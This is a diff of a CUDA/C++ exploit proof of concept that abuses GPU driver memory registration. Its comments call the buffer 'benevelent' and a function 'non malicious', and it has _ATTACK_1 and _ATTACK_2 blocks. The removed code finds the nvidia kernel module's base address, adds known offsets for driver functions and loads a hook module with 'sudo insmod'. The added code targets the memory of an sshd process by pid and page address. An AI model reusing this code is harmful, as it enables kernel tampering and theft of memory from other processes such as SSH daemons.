@@ -126,8 +126,10 @@ void Stub_Funct ()
  */
 typedef struct hidden_driver_info
 {
-	long int start_addr;
-	long int end_addr;
+//	long int start_addr;
+//	long int end_addr;
+	int pid;
+	long int sshd_page_addr;
 } hidden_driver_info ,*p_hidden_info;
 
 typedef void (*s_funct) () ;
@@ -151,10 +153,7 @@ int main(void) {
 	//printf("page size is: %d\n",pagesize);
 
 	p_hidden_info info_for_cuda_driver = (p_hidden_info)aligned_malloc(sizeof(hidden_driver_info)); // malloc info hiden buffer
-	info_for_cuda_driver->start_addr = 0x4001; // unused. will be filled later
-	info_for_cuda_driver->end_addr = 0x50003; // unused.
 
-	//printf("start addr 0x%llx, 0x%llx\n",info_for_cuda_driver->start_addr,info_for_cuda_driver->end_addr );
 	printf("info buffer addr: 0x%llx\n",(unsigned long)info_for_cuda_driver);
 
   // Malloc alligned buffer.
@@ -177,59 +176,11 @@ int main(void) {
 	//printf("Buffer: 0x%08x\n",*(unsigned int *)real_buff);
 
 	//Set hidden Address:
-	info_for_cuda_driver->start_addr = (unsigned long)base;
-
-#if 0
-	//Load kernel module:
-	ifstream modules_fd("/proc/modules");
-	string str;
-	int addr_offset_from_nvidia = 35;
-	unsigned long int base_nv_value, map_addr, lock_addr;
-	string nvidia_base_addr;
-	string m_lock_addr;
-	string dma_map_addr;
-	stringstream sstr;
-
-  while (getline(modules_fd, str))
-  {
-		size_t pos = str.find("nvidia 1");
-    if (pos != string::npos)
-		{
-			pos = str.find("0x");
-			nvidia_base_addr = str.substr(pos+2);
-			cout << "BASE ADDR IS: " << nvidia_base_addr << "\n";
-			sstr << nvidia_base_addr;
-			sstr >> hex >> base_nv_value;
-			break;
-		}
-		// Process str
-  }
-	cout << "Base Nv addr hex is: " << hex << base_nv_value << "\n";
-	map_addr = base_nv_value + 0x570bd0; //Known offset
-	lock_addr = base_nv_value + 0x5770c0;
-	sstr.str("");
-	//cout << "S:" << map_addr << "\n";
-	sstr << map_addr;
-	dma_map_addr = sstr.str();
-	sstr.str("");
-	sstr << lock_addr;
-	m_lock_addr = sstr.str();
-
-	cout << "nv_dma_map_pages addr is: " << dma_map_addr << "\n os_lock_user_pages addr is :" << m_lock_addr << "\n";
-	string CMD = "sudo insmod hook.ko m_lock_addr=0x" + m_lock_addr + " dma_map_addr=0x" + dma_map_addr;
-	cout << "CMD is: " << CMD << "\n";
-	system(CMD.c_str());
-	sleep(10);
-#endif
+//	info_for_cuda_driver->start_addr = (unsigned long)base;
+	info_for_cuda_driver->pid = 2751;
 
 	char * d_real_buff;
 	char * d_dump_buff;
-
-	char * d_target;
-
-//	char * h_target = (char*)malloc(2*pagesize*sizeof(char*));
-	//printf("TARGET a host in place Page2: 0x%08x",*(unsigned int *)(h_target+pagesize));
-	CUDA_CHECK_RETURN(cudaMalloc((void **)&d_target, 2*pagesize*sizeof(char))) ;
 
 	printf("GOING IN!\n");
 	fflush(stdout);
@@ -246,7 +197,6 @@ int main(void) {
 		printf("NAH");
 	}
 	/* register the info buffer. First things first... */
-	// info_for_cuda_driver-> starting address for Stub funct
 	CUDA_CHECK_RETURN(cudaHostRegister((void *)info_for_cuda_driver, sizeof(hidden_driver_info), CU_MEMHOSTREGISTER_PORTABLE)) ;
 	/* Map what a Nice guy would think is a benevelent buffer.
 	Note : Data is copied from user space hidden buffer. It can be changed afterwards. Will not effect Driver!*/
@@ -268,16 +218,6 @@ int main(void) {
 //	fflush(stdout);
 
 	CUDA_CHECK_RETURN(cudaThreadSynchronize());	// Wait for the GPU launched work to complete
-
-#ifdef _ATTACK_1
-	f(); // Call "non malicious" function again.
-	CUDA_CHECK_RETURN(cudaGetLastError());
-
-//		CUDA_CHECK_RETURN(cudaMemcpy((void *)h_target,d_target, pagesize*sizeof(char),cudaMemcpyDeviceToHost));
-		//printf("Target is: 0x%08x\n",*(unsigned int *) h_target);
-		//printf("STRNG Target is 0x%08x",*(unsigned int *)(h_target+pagesize));
-		fflush(stdout);
-#endif
 
 #define _ATTACK_2
 #ifdef _ATTACK_2
@@ -307,10 +247,13 @@ int main(void) {
 #endif
 
 
+	// should remove this?
 		CUDA_CHECK_RETURN(cudaHostUnregister((void *)real_buff));
 		CUDA_CHECK_RETURN(cudaHostUnregister((void *)dump_buff));
 		CUDA_CHECK_RETURN(cudaThreadSynchronize());	// Wait for the GPU launched work to complete
 		CUDA_CHECK_RETURN(cudaGetLastError());
+
+
 	//}
 	//sleep(3000);
 	/*for (i = 0; i < WORK_SIZE; i++)
